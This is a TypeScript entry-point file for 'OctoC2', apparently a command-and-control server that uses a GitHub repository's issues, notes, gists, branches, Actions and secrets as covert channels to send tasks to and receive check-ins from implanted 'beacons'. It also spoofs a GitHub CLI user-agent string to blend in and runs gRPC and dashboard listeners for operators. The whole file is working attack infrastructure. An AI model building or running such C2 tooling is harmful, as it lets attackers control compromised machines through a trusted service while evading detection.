/**
 * OctoC2 Server — Entry Point
 *
 * Loads operator keys, initializes the beacon registry, task queue, and
 * IssuesChannel polling loop, then blocks until shutdown.
 *
 * Required environment variables:
 *   OCTOC2_GITHUB_TOKEN     — PAT with repo scope for the C2 repo
 *   OCTOC2_REPO_OWNER       — GitHub org/user that owns the C2 repo
 *   OCTOC2_REPO_NAME        — C2 repository name
 *   OCTOC2_OPERATOR_SECRET  — Base64url X25519 secret key (from `octoctl keygen`)
 *
 * Semi-optional (one must be set):
 *   MONITORING_PUBKEY  — Base64url X25519 public key.
 *                             Preferred: set as a GitHub repo Variable so beacons
 *                             can discover it without baking it into binaries.
 *                             Fallback: this env var.
 *
 * Optional:
 *   OCTOC2_DATA_DIR         — Directory for registry.json (default: ./data)
 *   OCTOC2_POLL_INTERVAL_MS — Poll interval in ms        (default: 30000)
 *   OCTOC2_GRPC_PORT        — gRPC listener port         (default: 50051)
 *   OCTOC2_GRPC_DISABLED    — Set to any value to skip gRPC listener
 */

import { Octokit }                           from "@octokit/rest";
import { BeaconRegistry }                    from "./BeaconRegistry.ts";
import { TaskQueue }                         from "./TaskQueue.ts";
import { IssuesChannel, resolveOperatorPublicKey } from "./channels/IssuesChannel.ts";
import { NotesChannel }                      from "./channels/NotesChannel.ts";
import { GistChannel }                       from "./channels/GistChannel.ts";
import { BranchChannel }                     from "./channels/BranchChannel.ts";
import { ActionsChannel }                    from "./channels/ActionsChannel.ts";
import { SecretsChannel }                    from "./channels/SecretsChannel.ts";
import { BeaconGrpcService }                 from "./grpc/BeaconGrpcService.ts";
import { DashboardHttpServer }               from "./http/DashboardHttpServer.ts";
import { ModuleStore }                       from "./http/ModuleStore.ts";
import { base64ToBytes }                     from "./crypto/sodium.ts";

// ── Env helpers ───────────────────────────────────────────────────────────────

function requireEnv(name: string): string {
  const val = process.env[name];
  if (!val || val.trim() === "") {
    console.error(`[Server] Fatal: environment variable '${name}' is required but not set.`);
    process.exit(1);
  }
  return val.trim();
}

function optionalEnvInt(name: string, defaultVal: number): number {
  const val = process.env[name];
  if (!val) return defaultVal;
  const n = parseInt(val, 10);
  return isNaN(n) ? defaultVal : n;
}

function optionalEnvBool(name: string): boolean {
  return Boolean(process.env[name]);
}

// ── Startup ───────────────────────────────────────────────────────────────────

async function main(): Promise<void> {
  console.log("[OctoC2 Server] Starting operator controller…");

  // ── Load configuration ─────────────────────────────────────────────────────
  const token        = requireEnv("OCTOC2_GITHUB_TOKEN");
  const owner        = requireEnv("OCTOC2_REPO_OWNER");
  const repo         = requireEnv("OCTOC2_REPO_NAME");
  const secretB64    = requireEnv("OCTOC2_OPERATOR_SECRET");
  const pollInterval = optionalEnvInt("OCTOC2_POLL_INTERVAL_MS", 30_000);
  const grpcPort     = optionalEnvInt("OCTOC2_GRPC_PORT", 50051);
  const grpcDisabled = Boolean(process.env["OCTOC2_GRPC_DISABLED"]);
  const httpPort     = optionalEnvInt("OCTOC2_HTTP_PORT", 8080);
  const httpDisabled = optionalEnvBool("OCTOC2_HTTP_DISABLED");

  // Decode operator secret key
  const operatorSecretKey = await base64ToBytes(secretB64);
  if (operatorSecretKey.length !== 32) {
    console.error("[Server] Fatal: OCTOC2_OPERATOR_SECRET decoded to invalid length. Run: octoctl keygen");
    process.exit(1);
  }

  // Shared Octokit used for key resolution and passed to the channel
  const octokit = new Octokit({
    auth:    token,
    headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
  });

  // Resolve operator public key: GitHub Variable preferred, env fallback
  let operatorPublicKey: Uint8Array;
  try {
    operatorPublicKey = await resolveOperatorPublicKey(octokit, owner, repo);
  } catch (err) {
    console.error("[Server] Fatal:", (err as Error).message);
    process.exit(1);
  }

  // ── Initialize subsystems ──────────────────────────────────────────────────
  const dataDir   = process.env["OCTOC2_DATA_DIR"] ?? "./data";
  const registry  = new BeaconRegistry();
  const taskQueue = new TaskQueue();
  const moduleStore = new ModuleStore(dataDir);

  await registry.load();
  registry.startAutoSave();

  const channel = new IssuesChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorPublicKey,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,  // reuse the instance already used for key resolution
  });

  const notesChannel = new NotesChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,
  });

  const gistChannel = new GistChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,
  });

  const branchChannel = new BranchChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,
  });

  const actionsChannel = new ActionsChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,
  });

  const secretsChannel = new SecretsChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,
  });

  const grpcService = grpcDisabled ? null : new BeaconGrpcService(registry, taskQueue);

  const httpServer = httpDisabled
    ? null
    : new DashboardHttpServer(registry, taskQueue, token, moduleStore, { octokit, owner, repo }, operatorSecretKey);

  // ── Graceful shutdown ──────────────────────────────────────────────────────
  const shutdown = async (signal: string) => {
    console.log(`\n[Server] Received ${signal}. Shutting down…`);
    channel.stop();
    notesChannel.stop();
    gistChannel.stop();
    branchChannel.stop();
    actionsChannel.stop();
    secretsChannel.stop();
    if (grpcService) await grpcService.stop();
    if (httpServer) httpServer.stop();
    await registry.shutdown();
    console.log("[Server] Shutdown complete.");
    process.exit(0);
  };

  process.on("SIGINT",  () => { shutdown("SIGINT").catch(console.error); });
  process.on("SIGTERM", () => { shutdown("SIGTERM").catch(console.error); });

  // ── Start gRPC listener ────────────────────────────────────────────────────
  if (grpcService) {
    try {
      await grpcService.start(grpcPort);
    } catch (err) {
      console.error(
        `[Server] Fatal: gRPC listener failed to start on port ${grpcPort}: ${(err as Error).message}`
      );
      process.exit(1);
    }
  } else {
    console.log("[Server] gRPC listener disabled (OCTOC2_GRPC_DISABLED is set)");
  }

  // ── Start HTTP dashboard API ───────────────────────────────────────────────
  if (httpServer) {
    httpServer.start(httpPort);
  } else {
    console.log("[Server] HTTP dashboard API disabled (OCTOC2_HTTP_DISABLED is set)");
  }

  // ── Start Issues polling ───────────────────────────────────────────────────
  console.log(`[Server] Polling ${owner}/${repo} every ${pollInterval}ms`);
  console.log(`[Server] Registry: ${registry.getAll().length} beacon(s) loaded`);

  channel.start();
  notesChannel.start();
  gistChannel.start();
  branchChannel.start();
  actionsChannel.start();
  secretsChannel.start();

  console.log("[Server] Ready. Waiting for beacon checkins…");
}

main().catch((err) => {
  console.error("[Server] Unhandled startup error:", (err as Error).message);
  process.exit(1);
});
